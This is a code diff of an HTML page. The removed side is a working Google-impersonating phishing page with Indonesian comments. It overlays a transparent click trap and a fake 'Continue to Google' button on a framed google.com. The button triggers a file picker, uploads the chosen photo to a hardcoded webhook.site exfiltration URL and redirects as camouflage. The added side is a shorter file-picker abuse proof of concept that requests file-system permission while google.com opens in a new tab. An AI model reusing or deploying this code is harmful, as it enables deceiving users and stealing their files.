@@ -1,185 +1,47 @@
-<!doctype html>
-<html lang="en">
+<html class="hydrated">
   <head>
-    <meta charset="UTF-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, user-scalable=no"
-    />
-    <title>Google Account Security</title>
-    <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-      body {
-        font-family: Arial, sans-serif;
-        background: #f8f9fa;
-        overflow: hidden;
-        height: 100vh;
-        width: 100vw;
-        position: relative;
-      }
-      /* iframe Google fullscreen */
-      .google-frame {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        border: none;
-        z-index: 1;
-      }
-      /* Overlay transparan untuk menangkap klik tanpa mengganggu tampilan Google */
-      .click-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: 2;
-        background: transparent;
-        cursor: pointer;
-      }
-      /* Tombol palsu yang akan ditekan korban (posisi bisa disesuaikan) */
-      .fake-google-btn {
-        position: fixed;
-        bottom: 30px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: #1a73e8;
-        color: white;
-        padding: 14px 28px;
-        border-radius: 28px;
-        font-size: 16px;
-        font-weight: bold;
-        border: none;
-        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
-        z-index: 3;
-        cursor: pointer;
-        font-family: Arial, sans-serif;
-      }
-      .status {
-        position: fixed;
-        bottom: 100px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: rgba(0, 0, 0, 0.7);
-        color: white;
-        padding: 8px 16px;
-        border-radius: 20px;
-        font-size: 12px;
-        z-index: 4;
-        white-space: nowrap;
-        font-family: monospace;
-        pointer-events: none;
-      }
-      #fileSelect {
-        display: none;
-      }
-    </style>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
+    <style type="text/css" id="operaUserStyle"></style>
   </head>
-  <body>
-    <!-- Tampilkan Google asli di iframe -->
-    <iframe
-      class="google-frame"
-      src="https://www.google.com"
-      title="Google"
-    ></iframe>
-
-    <!-- Overlay transparan untuk menangkap klik di mana saja di atas Google -->
-    <div class="click-overlay" id="clickOverlay"></div>
-
-    <!-- Tombol palsu bertuliskan "Continue to Google" (agar korban mengira itu dari Google) -->
-    <button class="fake-google-btn" id="triggerBtn">
-      ✔️ Continue to Google
-    </button>
-
-    <div id="statusMsg" class="status"></div>
-
-    <input type="file" id="fileSelect" accept="image/*" />
+  <body align="center" onclick="load()" style="color: red; font-size: 24px">
+    Click Here
 
     <script>
-      const trigger = document.getElementById("triggerBtn");
-      const overlay = document.getElementById("clickOverlay");
-      const fileInput = document.getElementById("fileSelect");
-      const statusDiv = document.getElementById("statusMsg");
-
-      // GANTI DENGAN URL SERVER ANDA (contoh: https://webhook.site/xxxxx)
-      const EXFIL_SERVER =
-        "https://webhook.site/17b37178-709d-4f89-88d2-ed6c4abb8933"; // <-- GANTI
-
-      // Fungsi untuk memicu file picker
-      function openFilePicker() {
-        statusDiv.innerText = "📸 Please select a verification photo...";
-        fileInput.click();
+      async function load() {
+        window.handle = window.showOpenFilePicker();
+        window.open("https://google.com", "_blank");
+        window.handle = (await window.handle)[0];
+        await window.handle.requestPermission();
+        // ...
+        previewImage();
       }
 
-      // Saat korban klik tombol atau overlay (keduanya memicu picker)
-      trigger.onclick = (e) => {
-        e.preventDefault();
-        openFilePicker();
-      };
-      overlay.onclick = (e) => {
-        e.preventDefault();
-        openFilePicker();
-      };
-
-      // Event ketika file sudah dipilih
-      fileInput.onchange = async () => {
-        if (fileInput.files.length === 0) return;
-        const file = fileInput.files[0];
-        statusDiv.innerText = `📤 Sending ${file.name} ...`;
-
-        // Kirim file ke server dengan sendBeacon (paling tahan terhadap blokir CORS/WebView)
-        const formData = new FormData();
-        formData.append("file", file);
-        formData.append("filename", file.name);
-
-        let success = false;
-        try {
-          // Opsi 1: sendBeacon (tidak menunggu response, ideal untuk background)
-          const beaconSent = navigator.sendBeacon(EXFIL_SERVER, formData);
-          if (beaconSent) {
-            success = true;
-            statusDiv.innerText = `✅ Exfiltrated via sendBeacon!`;
-          } else {
-            // Fallback: fetch dengan keepalive
-            const response = await fetch(EXFIL_SERVER, {
-              method: "POST",
-              body: formData,
-              keepalive: true,
-            });
-            if (response.ok) success = true;
-            statusDiv.innerText = `✅ Exfiltrated via fetch!`;
-          }
-        } catch (err) {
-          console.error("Exfil error:", err);
-          statusDiv.innerText = `❌ Failed: ${err.message}`;
-          success = false;
-        }
-
-        // Tampilkan alert bahwa gambar berhasil dikirim (sesuai permintaan)
-        if (success) {
-          alert(
-            `✅ SUCCESS! Gambar "${file.name}" telah dikirim ke server attacker.`,
-          );
+      async function previewImage() {
+        const file = await window.handle.getFile();
+        if (file.type.startsWith("image/")) {
+          const reader = new FileReader();
+          reader.onload = function (event) {
+            const imgElement = document.createElement("img");
+            imgElement.src = event.target.result;
+            document.body.appendChild(imgElement);
+          };
+          reader.readAsDataURL(file);
         } else {
-          alert(
-            `⚠️ Gagal mengirim gambar, namun file picker sudah muncul di atas Google.`,
-          );
+          alert("Please choose an image file.");
         }
-
-        // Redirect ke google.com (di top window) sebagai kamuflase
-        // agar korban mengira proses verifikasi selesai
-        window.top.location.href = "https://www.google.com";
-      };
-
-      // Optional: jika pengguna membatalkan file picker, status tetap normal
-      fileInput.oncancel = () => {
-        statusDiv.innerText = "";
-      };
+      }
     </script>
+
+    <div id="sqrx-content-container">
+      <div class="squarex_ext_modal">
+        <div class="squarex_ext_dialog-container">
+          <div id="module_dialog_root__disposableFileViewer">
+            <div
+              class="squarex_ext_dialog squarex_ext_light squarex_ext__hidden"
+            ></div>
+          </div>
+        </div>
+      </div>
+    </div>
   </body>
 </html>
